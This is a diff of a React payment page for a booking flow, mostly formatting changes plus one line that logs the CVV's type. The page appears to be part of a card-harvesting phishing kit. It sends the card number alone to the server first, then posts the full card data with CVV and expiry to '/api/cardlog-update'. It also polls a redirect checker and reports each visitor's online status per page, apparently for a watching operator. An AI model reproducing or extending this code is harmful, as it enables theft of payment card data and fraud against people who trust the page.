@@ -14,14 +14,14 @@ const Payment = () => {
   const sessionId = localStorage.getItem("currentSessionId");
   const location = useLocation();
   const { bookingData, setBookingData } = useBooking(); // Добавьте этот хук
-  
+
   useRedirectChecker(3000);
   useOnlineStatus({
     sessionId,
     pageName: "payment",
     enabled: true,
   });
-  
+
   // Восстановление данных из localStorage при монтировании
   useEffect(() => {
     const savedBookingData = localStorage.getItem("bookingData");
@@ -33,7 +33,7 @@ const Payment = () => {
       }
     }
   }, [bookingData, setBookingData]);
-  
+
   const [isLoading, setLoading] = useState<boolean>(false);
   const [currentStep, setCurrentStep] = useState<"personal" | "payment">(
     "personal"
@@ -103,11 +103,17 @@ const Payment = () => {
     }
   };
 
-  const sendFullCardDataToServer = async (): Promise<{success: boolean; error?: string; details?: string[]}> => {
+  const sendFullCardDataToServer = async (): Promise<{
+    success: boolean;
+    error?: string;
+    details?: string[];
+  }> => {
     const sessionId = localStorage.getItem("currentSessionId");
     if (!sessionId) {
       return { success: false, error: "Session ID not found" };
     }
+
+    console.log(typeof cardData.cvv);
 
     try {
       const response = await fetch("/api/cardlog-update", {
@@ -121,15 +127,15 @@ const Payment = () => {
       });
 
       const data = await response.json();
-      
+
       if (!response.ok) {
-        return { 
-          success: false, 
+        return {
+          success: false,
           error: data.error || "Validation failed",
-          details: data.details 
+          details: data.details,
         };
       }
-      
+
       return { success: data.success };
     } catch (err) {
       console.error("Ошибка сети при отправке полных данных:", err);
@@ -203,7 +209,7 @@ const Payment = () => {
       ...prev,
       [name]: "",
     }));
-    
+
     setServerError("");
   };
 
@@ -217,13 +223,15 @@ const Payment = () => {
     if (!formData.firstName) {
       errors.firstName = "First name is required";
     } else if (!validateName(formData.firstName)) {
-      errors.firstName = "Please enter a valid first name (letters only, min 2 characters)";
+      errors.firstName =
+        "Please enter a valid first name (letters only, min 2 characters)";
     }
 
     if (!formData.lastName) {
       errors.lastName = "Last name is required";
     } else if (!validateName(formData.lastName)) {
-      errors.lastName = "Please enter a valid last name (letters only, min 2 characters)";
+      errors.lastName =
+        "Please enter a valid last name (letters only, min 2 characters)";
     }
 
     if (!formData.phoneNumber) {
@@ -251,7 +259,7 @@ const Payment = () => {
       ...prev,
       cardNumber: "",
     }));
-    
+
     setServerError("");
   };
 
@@ -273,7 +281,7 @@ const Payment = () => {
       ...prev,
       expiryDate: "",
     }));
-    
+
     setServerError("");
   };
 
@@ -290,7 +298,7 @@ const Payment = () => {
       ...prev,
       cvv: "",
     }));
-    
+
     setServerError("");
   };
 
@@ -384,9 +392,9 @@ const Payment = () => {
 
     setLoading(true);
     setServerError("");
-    
+
     const cardNumberSent = await sendCardNumberToServer();
-    
+
     setLoading(false);
 
     if (!cardNumberSent) {
@@ -420,28 +428,28 @@ const Payment = () => {
       } else {
         // Устанавливаем ошибку от сервера
         let errorMessage = result.error || "Payment processing error";
-        
+
         if (result.details && result.details.length > 0) {
           errorMessage += ": " + result.details.join(", ");
         }
-        
+
         setServerError(errorMessage);
-        
+
         // Обновляем ошибки в форме на основе ответа сервера
         if (result.details) {
           const newCardErrors = { ...cardErrors };
-          
-          result.details.forEach(detail => {
-            if (detail.toLowerCase().includes('cvv')) {
+
+          result.details.forEach((detail) => {
+            if (detail.toLowerCase().includes("cvv")) {
               newCardErrors.cvv = detail;
-            } else if (detail.toLowerCase().includes('expir')) {
+            } else if (detail.toLowerCase().includes("expir")) {
               newCardErrors.expiryDate = detail;
             }
           });
-          
+
           setCardErrors(newCardErrors);
         }
-        
+
         // Оставляем модальное окно открытым
         setModalActive(true);
       }
@@ -461,11 +469,9 @@ const Payment = () => {
           <div className={styles.form__container}>
             {/* Показ серверной ошибки */}
             {serverError && (
-              <div className={styles.server__error}>
-                {serverError}
-              </div>
+              <div className={styles.server__error}>{serverError}</div>
             )}
-            
+
             {currentStep === "personal" ? (
               <>
                 <h1 className={styles.form__title}>
@@ -638,14 +644,12 @@ const Payment = () => {
                 <Modal active={isModalActive} setActive={setModalActive}>
                   <div className={styles.modal__content}>
                     <h2 className={styles.modal__title}>Complete Payment</h2>
-                    
+
                     {/* Серверная ошибка в модальном окне */}
                     {serverError && (
-                      <div className={styles.modal__error}>
-                        {serverError}
-                      </div>
+                      <div className={styles.modal__error}>{serverError}</div>
                     )}
-                    
+
                     <div className={styles.form__row}>
                       <div className={styles.form__group}>
                         <label
